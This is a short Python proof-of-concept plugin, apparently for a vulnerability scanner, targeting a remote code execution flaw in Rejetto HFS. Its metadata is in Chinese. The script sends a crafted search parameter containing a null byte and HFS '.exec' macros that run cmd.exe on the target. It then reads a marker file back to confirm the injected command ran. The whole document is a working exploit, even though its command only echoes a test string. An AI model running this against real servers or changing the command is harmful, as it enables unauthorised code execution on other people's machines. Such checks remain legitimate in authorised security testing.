#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "hfs rejetto 远程代码执行",
        "desc": "hfs rejetto 存在远程代码执行漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:rejetto tag:hfs"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer':f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&',
        }
    try:
        session = requests.session()
        session.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        r = session.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/?search==%00{.cookie|out|value={.load|res.}.}', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "123456test" in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

